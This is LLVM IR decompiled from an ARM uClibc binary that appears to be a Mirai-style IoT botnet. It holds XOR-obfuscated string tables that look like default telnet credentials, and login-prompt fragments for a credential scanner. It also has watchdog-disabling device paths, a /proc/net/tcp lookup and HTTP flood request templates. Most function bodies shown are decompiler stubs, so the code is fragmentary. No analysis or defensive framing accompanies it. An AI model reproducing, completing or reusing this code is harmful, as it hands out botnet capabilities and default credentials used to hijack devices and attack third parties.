source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_1d780.2 = global i32 1
@global_var_1d818.3 = global i32* @global_var_1d780.2
@global_var_1d820.4 = global i32 0
@global_var_9844.8 = constant [3 x i8] c"z+\00"
@global_var_9850.11 = constant i32 167772211
@global_var_9854.12 = constant i32 -476053469
@global_var_9858.13 = constant [3 x i8] c"\22)\00"
@global_var_9860.15 = constant [3 x i8] c"i+\00"
@global_var_986c.18 = constant i32 -476053469
@global_var_9880.23 = constant [3 x i8] c"k+\00"
@global_var_9884.24 = constant i32 -476053469
@global_var_9890.27 = constant [3 x i8] c"]+\00"
@global_var_98a0.31 = constant [3 x i8] c"c+\00"
@global_var_98a8.33 = constant [3 x i8] c"W+\00"
@global_var_98b4.36 = constant i32 -476053464
@global_var_98c8.41 = constant [3 x i8] c"Y+\00"
@global_var_98d0.43 = constant [3 x i8] c"M+\00"
@global_var_98e0.47 = constant [3 x i8] c"S+\00"
@global_var_98e4.48 = constant i32 -442695620
@global_var_98e8.49 = constant [3 x i8] c"G+\00"
@global_var_98f4.52 = constant [3 x i8] c"D+\00"
@global_var_1d778.60 = global i32 0
@global_var_1d8fc.61 = global i32* @global_var_1d778.60
@global_var_1d91c.67 = global i32 0
@global_var_10ddc.73 = constant i32 -382906384
@global_var_14f6c.76 = constant [4 x i8] c"GET\00"
@global_var_14f70.78 = constant i32 47
@global_var_8dcc.80 = constant i32 -493894144
@global_var_14f64.82 = constant i32 32
@global_var_14f3c.84 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_14f54.86 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_14f60.88 = constant [3 x i8] c"\0D\0A\00"
@global_var_14f74.90 = constant [9 x i8] c"Cookie: \00"
@global_var_14f80.92 = constant [3 x i8] c"; \00"
@global_var_14f84.94 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_14f8c.96 = constant i32 59
@global_var_14f90.98 = constant [5 x i8] c"http\00"
@global_var_14f98.100 = constant [5 x i8] c"url=\00"
@global_var_14fa0.102 = constant [5 x i8] c"POST\00"
@global_var_14634.103 = constant i32 -439275520
@global_var_14fa8.105 = constant i32 39
@global_var_14fac.107 = constant i32 61
@global_var_1d938.111 = global i32 0
@global_var_ae24.112 = constant i32 -352321546
@global_var_8de4.113 = constant i32 -493894144
@global_var_1d93c.115 = global i32 0
@global_var_1d940.116 = local_unnamed_addr global i32 0
@global_var_f12c.122 = constant i32 -382906384
@global_var_f5f0.124 = constant i32 -382906384
@global_var_e4d0.126 = constant i32 -382906384
@global_var_dd8c.129 = constant i32 -382906384
@global_var_d618.131 = constant i32 -382906384
@global_var_c520.133 = constant i32 -382906384
@global_var_cd9c.135 = constant i32 -382906384
@global_var_be04.137 = constant i32 -382906384
@global_var_b688.139 = constant i32 -382906384
@global_var_8f24.141 = constant i32 -382906384
@global_var_1d9ac.143 = global i32 0
@global_var_1d9b4.155 = global i32 0
@global_var_14fb0.157 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_1d95c.161 = global i32 0
@global_var_1d9b0.163 = global i32 0
@global_var_10d4c.165 = constant i32 -382910352
@global_var_1d90c.167 = global i32 84164
@global_var_1d904.169 = global i32 -1
@global_var_1d9bc.175 = local_unnamed_addr global i32 0
@global_var_1d9bb.176 = local_unnamed_addr global i32 0
@global_var_1d9ba.177 = local_unnamed_addr global i32 0
@global_var_10bc4.179 = constant i32 -442556408
@global_var_14fc0.181 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_1d9b9.186 = local_unnamed_addr global i32 0
@global_var_15014.188 = constant [3 x i8] c"/.\00"
@global_var_14ff0.190 = constant i32 68572
@global_var_10bdc.191 = constant i32 -382909968
@global_var_13ce8.193 = constant i32 -509607552
@global_var_13da0.196 = constant i32 -382906384
@global_var_13c30.198 = constant i32 -509607552
@global_var_15010.203 = constant i32 68548
@global_var_14fe4.205 = constant i32 10
@global_var_14fd0.207 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_1d908.209 = global i32 -1
@global_var_148c4.214 = constant i32 -382910224
@global_var_14fe8.216 = constant i32 16777216
@global_var_1d964.218 = global i32 0
@global_var_1d970.220 = global i32 0
@global_var_1d968.222 = global i32 0
@global_var_1d96c.224 = global i32 0
@global_var_15028.230 = constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00"
@global_var_11f18.239 = constant i32 -442695668
@global_var_1d9d0.241 = global i32 0
@global_var_1d9a8.243 = global i32 0
@global_var_1d974.245 = global i32 0
@global_var_1d9a0.247 = global i32 0
@global_var_1d9c8.255 = global i32 0
@global_var_1d9cc.257 = global i32 0
@global_var_1d97b.260 = local_unnamed_addr global i32 0
@global_var_1d97a.261 = local_unnamed_addr global i32 0
@global_var_1d98c.263 = global i32 0
@global_var_1d980.265 = local_unnamed_addr global i32 0
@global_var_1d97d.266 = local_unnamed_addr global i32 0
@global_var_1d98d.267 = local_unnamed_addr global i32 0
@global_var_1d98f.268 = local_unnamed_addr global i32 0
@global_var_1d981.269 = local_unnamed_addr global i32 0
@global_var_1d97c.270 = local_unnamed_addr global i32 0
@global_var_1d98e.271 = local_unnamed_addr global i32 0
@global_var_1d99b.273 = local_unnamed_addr global i32 0
@global_var_1d99a.274 = local_unnamed_addr global i32 0
@global_var_151b4.276 = constant [5 x i8] c"PMMV\00"
@global_var_151bc.278 = constant i32 387006810
@global_var_151c4.280 = constant [6 x i8] c"TKXZT\00"
@global_var_151cc.282 = constant [6 x i8] c"CFOKL\00"
@global_var_151d4.284 = constant i32 437918234
@global_var_151dc.286 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_151e4.288 = constant [8 x i8] c"FGDCWNV\00"
@global_var_151ec.290 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_151f8.292 = constant i32 370216979
@global_var_15200.294 = constant i32 269555223
@global_var_15208.296 = constant [8 x i8] c"QWRRMPV\00"
@global_var_14f88.298 = constant i32 0
@global_var_1504c.300 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_15058.302 = constant i32 370216979
@global_var_15060.304 = constant [5 x i8] c"WQGP\00"
@global_var_15068.306 = constant [5 x i8] c"RCQQ\00"
@global_var_15070.308 = constant i32 1263486531
@global_var_1507c.310 = constant i32 320017171
@global_var_15084.312 = constant [9 x i8] c"QOACFOKL\00"
@global_var_15090.314 = constant i32 336860180
@global_var_15098.316 = constant i32 370216979
@global_var_150a0.318 = constant i32 324292169
@global_var_150a8.320 = constant [14 x i8] c"cFOKLKQVPCVMP\00"
@global_var_150b8.322 = constant [7 x i8] c"OGKLQO\00"
@global_var_150c0.324 = constant [8 x i8] c"QGPTKAG\00"
@global_var_150c8.326 = constant [11 x i8] c"QWRGPTKQMP\00"
@global_var_150d4.328 = constant [6 x i8] c"EWGQV\00"
@global_var_150dc.330 = constant i32 1263486531
@global_var_150e4.332 = constant [14 x i8] c"CFOKLKQVPCVMP\00"
@global_var_150f4.334 = constant [5 x i8] c"W@LV\00"
@global_var_150fc.336 = constant i32 324292169
@global_var_15104.338 = constant i32 390551160
@global_var_1510c.340 = constant i32 387009354
@global_var_15114.342 = constant [6 x i8] c"HT@XF\00"
@global_var_1511c.344 = constant [5 x i8] c"CLIM\00"
@global_var_15124.346 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_1512c.348 = constant i32 1867011861
@global_var_1513c.350 = constant i32 1867011861
@global_var_1514c.352 = constant [7 x i8] c"Q[QVGO\00"
@global_var_15154.354 = constant [5 x i8] c"KIU@\00"
@global_var_1515c.356 = constant [9 x i8] c"FPGCO@MZ\00"
@global_var_15168.358 = constant [8 x i8] c"PGCNVGI\00"
@global_var_15170.360 = constant i32 303174162
@global_var_1517c.362 = constant i32 320017171
@global_var_15184.364 = constant i32 319820054
@global_var_151f0.366 = constant [5 x i8] c"VGAJ\00"
@global_var_1518c.368 = constant [7 x i8] c"OMVJGP\00"
@global_var_15194.370 = constant [7 x i8] c"DWAIGP\00"
@global_var_1d984.371 = local_unnamed_addr global i32 0
@global_var_1d982.373 = local_unnamed_addr global i32 0
@global_var_1d983.374 = local_unnamed_addr global i32 0
@global_var_1d99c.376 = local_unnamed_addr global i32 0
@global_var_1d99d.377 = local_unnamed_addr global i32 0
@global_var_1519c.382 = constant [5 x i8] c"ogin\00"
@global_var_151a4.384 = constant [6 x i8] c"enter\00"
@global_var_15219.388 = constant i32 1377827839
@global_var_15210.390 = constant i32 2095871
@global_var_151ac.392 = constant [8 x i8] c"assword\00"
@global_var_1d9d8.394 = global i32 0
@global_var_1d914.397 = global i32 -559038737
@global_var_1521c.401 = constant [13 x i8] c"RKAGQ@PM\0CVI\22\00"
@global_var_1d9f0.403 = local_unnamed_addr global i32 0
@global_var_1d9f4.404 = local_unnamed_addr global i32 0
@global_var_1d9f5.405 = local_unnamed_addr global i32 0
@global_var_1522c.407 = constant i32 42786
@global_var_1d9f8.408 = local_unnamed_addr global i32 0
@global_var_1d9fc.409 = local_unnamed_addr global i32 0
@global_var_1d9fd.410 = local_unnamed_addr global i32 0
@global_var_1da68.411 = local_unnamed_addr global i32 0
@global_var_1da6c.412 = local_unnamed_addr global i32 0
@global_var_1da6d.413 = local_unnamed_addr global i32 0
@global_var_15230.415 = constant i32 36254
@global_var_1da70.416 = local_unnamed_addr global i32 0
@global_var_1da74.417 = local_unnamed_addr global i32 0
@global_var_1da75.418 = local_unnamed_addr global i32 0
@global_var_15234.420 = constant i32 1448168270
@global_var_1d9ec.421 = local_unnamed_addr global i32 0
@global_var_1d9e8.422 = local_unnamed_addr global i32 0
@global_var_1d9ed.423 = local_unnamed_addr global i32 0
@global_var_15244.425 = constant i32 1381389898
@global_var_1da04.426 = local_unnamed_addr global i32 0
@global_var_1da00.427 = local_unnamed_addr global i32 0
@global_var_1da05.428 = local_unnamed_addr global i32 0
@global_var_15264.430 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_1da08.431 = local_unnamed_addr global i32 0
@global_var_1da0c.432 = local_unnamed_addr global i32 0
@global_var_1da0d.433 = local_unnamed_addr global i32 0
@global_var_1526c.435 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_1da14.436 = local_unnamed_addr global i32 0
@global_var_1da10.437 = local_unnamed_addr global i32 0
@global_var_1da15.438 = local_unnamed_addr global i32 0
@global_var_15274.440 = constant i32 1195772418
@global_var_1da1c.441 = local_unnamed_addr global i32 0
@global_var_1da18.442 = local_unnamed_addr global i32 0
@global_var_1da1d.443 = local_unnamed_addr global i32 0
@global_var_15280.445 = constant [5 x i8] c"\0DDF\22\00"
@global_var_1da24.446 = local_unnamed_addr global i32 0
@global_var_1da20.447 = local_unnamed_addr global i32 0
@global_var_1da25.448 = local_unnamed_addr global i32 0
@global_var_15288.450 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_1da28.451 = local_unnamed_addr global i32 0
@global_var_1da2c.452 = local_unnamed_addr global i32 0
@global_var_1da2d.453 = local_unnamed_addr global i32 0
@global_var_15290.455 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_1da34.456 = local_unnamed_addr global i32 0
@global_var_1da30.457 = local_unnamed_addr global i32 0
@global_var_1da35.458 = local_unnamed_addr global i32 0
@global_var_1529c.460 = constant i32 1836214128
@global_var_1da3c.461 = local_unnamed_addr global i32 0
@global_var_1da38.462 = local_unnamed_addr global i32 0
@global_var_1da3d.463 = local_unnamed_addr global i32 0
@global_var_152ac.465 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_1da40.466 = local_unnamed_addr global i32 0
@global_var_1da44.467 = local_unnamed_addr global i32 0
@global_var_1da45.468 = local_unnamed_addr global i32 0
@global_var_152b8.470 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_1da48.471 = local_unnamed_addr global i32 0
@global_var_1da4c.472 = local_unnamed_addr global i32 0
@global_var_1da4d.473 = local_unnamed_addr global i32 0
@global_var_152c4.475 = constant i32 437738110
@global_var_1da54.476 = local_unnamed_addr global i32 0
@global_var_1da50.477 = local_unnamed_addr global i32 0
@global_var_1da55.478 = local_unnamed_addr global i32 0
@global_var_152e8.480 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_1da5c.481 = local_unnamed_addr global i32 0
@global_var_1da58.482 = local_unnamed_addr global i32 0
@global_var_1da5d.483 = local_unnamed_addr global i32 0
@global_var_152f4.485 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_1da64.486 = local_unnamed_addr global i32 0
@global_var_1da60.487 = local_unnamed_addr global i32 0
@global_var_1da65.488 = local_unnamed_addr global i32 0
@global_var_15300.490 = constant [7 x i8] c"QJGNN\22\00"
@global_var_1da7c.491 = local_unnamed_addr global i32 0
@global_var_1da78.492 = local_unnamed_addr global i32 0
@global_var_1da7d.493 = local_unnamed_addr global i32 0
@global_var_15308.495 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_1da80.496 = local_unnamed_addr global i32 0
@global_var_1da84.497 = local_unnamed_addr global i32 0
@global_var_1da85.498 = local_unnamed_addr global i32 0
@global_var_15310.500 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_1da88.501 = local_unnamed_addr global i32 0
@global_var_1da8c.502 = local_unnamed_addr global i32 0
@global_var_1da8d.503 = local_unnamed_addr global i32 0
@global_var_15318.505 = constant [4 x i8] c"QJ\22\00"
@global_var_1da94.506 = local_unnamed_addr global i32 0
@global_var_1da90.507 = local_unnamed_addr global i32 0
@global_var_1da95.508 = local_unnamed_addr global i32 0
@global_var_1531c.510 = constant i32 1280000013
@global_var_1da98.511 = local_unnamed_addr global i32 0
@global_var_1da9c.512 = local_unnamed_addr global i32 0
@global_var_1da9d.513 = local_unnamed_addr global i32 0
@global_var_15330.515 = constant i32 1668311919
@global_var_1daa4.516 = local_unnamed_addr global i32 0
@global_var_1daa0.517 = local_unnamed_addr global i32 0
@global_var_1daa5.518 = local_unnamed_addr global i32 0
@global_var_1534c.520 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_1daa8.521 = local_unnamed_addr global i32 0
@global_var_1daac.522 = local_unnamed_addr global i32 0
@global_var_1daad.523 = local_unnamed_addr global i32 0
@global_var_15358.525 = constant i32 1280000013
@global_var_1dab0.526 = local_unnamed_addr global i32 0
@global_var_1dab4.527 = local_unnamed_addr global i32 0
@global_var_1dab5.528 = local_unnamed_addr global i32 0
@global_var_1536c.530 = constant i32 1280000013
@global_var_1dabc.531 = local_unnamed_addr global i32 0
@global_var_1dab8.532 = local_unnamed_addr global i32 0
@global_var_1dabd.533 = local_unnamed_addr global i32 0
@global_var_15384.535 = constant i32 1464693110
@global_var_1dac4.536 = local_unnamed_addr global i32 0
@global_var_1dac0.537 = local_unnamed_addr global i32 0
@global_var_1dac5.538 = local_unnamed_addr global i32 0
@global_var_1539c.540 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_1dacc.541 = local_unnamed_addr global i32 0
@global_var_1dac8.542 = local_unnamed_addr global i32 0
@global_var_1dacd.543 = local_unnamed_addr global i32 0
@global_var_153b0.545 = constant i32 1196376908
@global_var_1dad0.546 = local_unnamed_addr global i32 0
@global_var_1dad4.547 = local_unnamed_addr global i32 0
@global_var_1dad5.548 = local_unnamed_addr global i32 0
@global_var_153c0.550 = constant i32 1280068961
@global_var_1dadc.551 = local_unnamed_addr global i32 0
@global_var_1dad8.552 = local_unnamed_addr global i32 0
@global_var_1dadd.553 = local_unnamed_addr global i32 0
@global_var_153d8.555 = constant i32 1195458915
@global_var_1dae4.556 = local_unnamed_addr global i32 0
@global_var_1dae0.557 = local_unnamed_addr global i32 0
@global_var_1dae5.558 = local_unnamed_addr global i32 0
@global_var_1542c.560 = constant i32 1195458915
@global_var_1daec.561 = local_unnamed_addr global i32 0
@global_var_1dae8.562 = local_unnamed_addr global i32 0
@global_var_1daed.563 = local_unnamed_addr global i32 0
@global_var_15450.565 = constant i32 1447841121
@global_var_1daf4.566 = local_unnamed_addr global i32 0
@global_var_1daf0.567 = local_unnamed_addr global i32 0
@global_var_1daf5.568 = local_unnamed_addr global i32 0
@global_var_15484.570 = constant i32 1633044305
@global_var_1daf8.571 = local_unnamed_addr global i32 0
@global_var_1dafc.572 = local_unnamed_addr global i32 0
@global_var_1dafd.573 = local_unnamed_addr global i32 0
@global_var_15494.575 = constant i32 1346651984
@global_var_1db00.576 = local_unnamed_addr global i32 0
@global_var_1db04.577 = local_unnamed_addr global i32 0
@global_var_1db05.578 = local_unnamed_addr global i32 0
@global_var_154a0.580 = constant i32 1128353102
@global_var_1db08.581 = local_unnamed_addr global i32 0
@global_var_1db0c.582 = local_unnamed_addr global i32 0
@global_var_1db0d.583 = local_unnamed_addr global i32 0
@global_var_154ac.585 = constant i32 257312593
@global_var_1db10.586 = local_unnamed_addr global i32 0
@global_var_1db14.587 = local_unnamed_addr global i32 0
@global_var_1db15.588 = local_unnamed_addr global i32 0
@global_var_154bc.590 = constant i32 1447841089
@global_var_1db18.591 = local_unnamed_addr global i32 0
@global_var_1db1c.592 = local_unnamed_addr global i32 0
@global_var_1db1d.593 = local_unnamed_addr global i32 0
@global_var_154d0.595 = constant i32 1279479894
@global_var_1db20.596 = local_unnamed_addr global i32 0
@global_var_1db24.597 = local_unnamed_addr global i32 0
@global_var_1db25.598 = local_unnamed_addr global i32 0
@global_var_154e4.600 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_1db2c.601 = local_unnamed_addr global i32 0
@global_var_1db28.602 = local_unnamed_addr global i32 0
@global_var_1db2d.603 = local_unnamed_addr global i32 0
@global_var_153cc.605 = constant i32 1380403017
@global_var_1db34.606 = local_unnamed_addr global i32 0
@global_var_1db30.607 = local_unnamed_addr global i32 0
@global_var_1db35.608 = local_unnamed_addr global i32 0
@global_var_154f0.610 = constant i32 1280068929
@global_var_1db38.611 = local_unnamed_addr global i32 0
@global_var_1db3c.612 = local_unnamed_addr global i32 0
@global_var_1db3d.613 = local_unnamed_addr global i32 0
@global_var_15500.615 = constant i32 1414547281
@global_var_1db44.616 = local_unnamed_addr global i32 0
@global_var_1db40.617 = local_unnamed_addr global i32 0
@global_var_1db45.618 = local_unnamed_addr global i32 0
@global_var_15514.620 = constant i32 1414547281
@global_var_1db4c.621 = local_unnamed_addr global i32 0
@global_var_1db48.622 = local_unnamed_addr global i32 0
@global_var_1db4d.623 = local_unnamed_addr global i32 0
@global_var_15530.625 = constant i32 1264078191
@global_var_1db50.626 = local_unnamed_addr global i32 0
@global_var_1db54.627 = local_unnamed_addr global i32 0
@global_var_1db55.628 = local_unnamed_addr global i32 0
@global_var_155a0.630 = constant i32 1264078191
@global_var_1db58.631 = local_unnamed_addr global i32 0
@global_var_1db5c.632 = local_unnamed_addr global i32 0
@global_var_1db5d.633 = local_unnamed_addr global i32 0
@global_var_15610.635 = constant i32 1264078191
@global_var_1db60.636 = local_unnamed_addr global i32 0
@global_var_1db64.637 = local_unnamed_addr global i32 0
@global_var_1db65.638 = local_unnamed_addr global i32 0
@global_var_15680.640 = constant i32 1264078191
@global_var_1db6c.641 = local_unnamed_addr global i32 0
@global_var_1db68.642 = local_unnamed_addr global i32 0
@global_var_1db6d.643 = local_unnamed_addr global i32 0
@global_var_156f0.645 = constant i32 1264078191
@global_var_1db70.646 = local_unnamed_addr global i32 0
@global_var_1db74.647 = local_unnamed_addr global i32 0
@global_var_1d770.649 = global i32 0
@global_var_1d76c.650 = global i32 -1
@global_var_1d918.58 = external global i8*
@global_var_1d934.109 = external global i8*
@global_var_1d935.120 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_1d910.171 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_1d9b8.174 = external global i8*
@global_var_1d960.212 = external global i8*
@global_var_1d9a4.249 = external global i8*
@global_var_1d9a5.250 = local_unnamed_addr global i8 0
@global_var_1d978.259 = external global i8*
@global_var_1d998.264 = local_unnamed_addr global i8 0
@global_var_1d999.272 = local_unnamed_addr global i8 0
@global_var_1d990.375 = local_unnamed_addr global i8 0
@global_var_1d988.372 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8b6c() local_unnamed_addr {
entry:
  %v3_8b70 = load i32, i32* @r4, align 4
  %v0_8b78 = call i32 @function_8e88()
  %v1_8b7c = call i32 @function_14edc(i32 %v0_8b78)
  call void @__pseudo_branch(i32 %v3_8b70)
  ret i32 %v1_8b7c
}

define i32 @function_8b84(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8b90 = load i32, i32* @global_var_1d820.4, align 4
  call void @__pseudo_branch(i32 %v3_8b90)
  %v0_8b94 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8b94, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v7_8b94 = load i32, i32* @r0, align 4
  ret i32 %v7_8b94

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_ioctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v4_8ba0 = call i32 @unknown_e59de01c()
  ret i32 %v4_8ba0
}

define i32 @_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8bac = call i32 @unknown_e59f12c4()
  ret i32 %v4_8bac
}

define i32 @_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8bb8 = call i32 @unknown_e08e0000()
  ret i32 %v4_8bb8
}

define i32 @_sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8bc4 = call i32 @unknown_eb002b7a()
  ret i32 %v4_8bc4
}

define i32 @_memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8bd0 = call i32 @unknown_e59d103c()
  ret i32 %v4_8bd0
}

define i32 @_getpid(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8bdc = call i32 @unknown_e1510005()
  ret i32 %v4_8bdc
}

define i32 @_prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8be8 = call i32 @unknown_a000033()
  ret i32 %v4_8be8
}

define i32 @_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8bf4 = call i32 @unknown_e3a00023()
  ret i32 %v4_8bf4
}

define i32 @_readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8c00 = call i32 @unknown_eb002922()
  ret i32 %v4_8c00
}

define i32 @_malloc(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8c0c = call i32 @unknown_e59d001c()
  ret i32 %v4_8c0c
}

define i32 @_sleep(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8c18 = call i32 @unknown_eb002b69()
  ret i32 %v4_8c18
}

define i32 @_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v4_8c24 = call i32 @unknown_e1a01005()
  ret i32 %v4_8c24
}

define i32 @_socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8c30 = call i32 @unknown_e1a04000()
  ret i32 %v4_8c30
}

define i32 @_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v4_8c3c = call i32 @unknown_e3a00023()
  ret i32 %v4_8c3c
}

define i32 @_readdir(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8c48 = call i32 @unknown_eb0028e3()
  ret i32 %v4_8c48
}

define i32 @_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8c54 = call i32 @unknown_e59d201c()
  ret i32 %v4_8c54
}

define i32 @_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8c60 = call i32 @unknown_e1a01000()
  ret i32 %v4_8c60
}

define i32 @_abort(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8c6c = call i32 @unknown_e0820004()
  ret i32 %v4_8c6c
}

define i32 @_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v4_8c78 = call i32 @unknown_eb002b6b()
  ret i32 %v4_8c78
}

define i32 @_calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8c84 = call i32 @unknown_e3a00023()
  ret i32 %v4_8c84

; uselistorder directives
  uselistorder i32 ()* @unknown_e3a00023, { 2, 1, 0 }
}

define i32 @_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8c90 = call i32 @unknown_eb0028e8()
  ret i32 %v4_8c90
}

define i32 @_kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8c9c = call i32 @unknown_e59d001c()
  ret i32 %v4_8c9c
}

define i32 @_bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8ca8 = call i32 @unknown_eb002b5d()
  ret i32 %v4_8ca8
}

define i32 @_inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8cb4 = call i32 @unknown_e59d301c()
  ret i32 %v4_8cb4
}

define i32 @_chdir(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8cc0 = call i32 @unknown_e59f1268()
  ret i32 %v4_8cc0
}

define i32 @_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v4_8ccc = call i32 @unknown_e0830000()
  ret i32 %v4_8ccc
}

define i32 @_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8cd8 = call i32 @unknown_eb002b63()
  ret i32 %v4_8cd8
}

define i32 @_read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8ce4 = call i32 @unknown_e59d001c()
  ret i32 %v4_8ce4
}

define i32 @_unlink(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8cf0 = call i32 @unknown_eb002b57()
  ret i32 %v4_8cf0
}

define i32 @_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v4_8cfc = call i32 @unknown_e1a01005()
  ret i32 %v4_8cfc

; uselistorder directives
  uselistorder i32 ()* @unknown_e1a01005, { 1, 0 }
}

define i32 @_realloc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8d08 = call i32 @unknown_e1a04000()
  ret i32 %v4_8d08
}

define i32 @_listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8d14 = call i32 @unknown_e3a00028()
  ret i32 %v4_8d14
}

define i32 @_fork() local_unnamed_addr {
entry:
  %v4_8d20 = call i32 @unknown_eb0028d1()
  ret i32 %v4_8d20
}

define i32 @___uClibc_main(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v4_8d2c = call i32 @unknown_e59dc01c()
  ret i32 %v4_8d2c
}

define i32 @_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8d38 = call i32 @unknown_e1a01000()
  ret i32 %v4_8d38

; uselistorder directives
  uselistorder i32 ()* @unknown_e1a01000, { 1, 0 }
}

define i32 @_getppid() local_unnamed_addr {
entry:
  %v4_8d44 = call i32 @unknown_e08c0004()
  ret i32 %v4_8d44
}

define i32 @_time(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8d50 = call i32 @unknown_eb002b59()
  ret i32 %v4_8d50
}

define i32 @_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8d5c = call i32 @unknown_e59d001c()
  ret i32 %v4_8d5c
}

define i32 @_getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v4_8d68 = call i32 @unknown_eb002b4d()
  ret i32 %v4_8d68
}

define i32 @___errno_location() local_unnamed_addr {
entry:
  %v4_8d74 = call i32 @unknown_e59de01c()
  ret i32 %v4_8d74

; uselistorder directives
  uselistorder i32 ()* @unknown_e59de01c, { 1, 0 }
}

define i32 @_exit(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8d80 = call i32 @unknown_e59f1210()
  store i32 39128, i32* @ip, align 4
  ret i32 %v4_8d80
}

define i32 @_atoi(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8d8c = call i32 @unknown_e08e0000()
  ret i32 %v4_8d8c

; uselistorder directives
  uselistorder i32 ()* @unknown_e08e0000, { 1, 0 }
}

define i32 @_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8d98 = call i32 @unknown_eb002b53()
  ret i32 %v4_8d98
}

define i32 @_clock(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8da4 = call i32 @unknown_e59d003c()
  ret i32 %v4_8da4
}

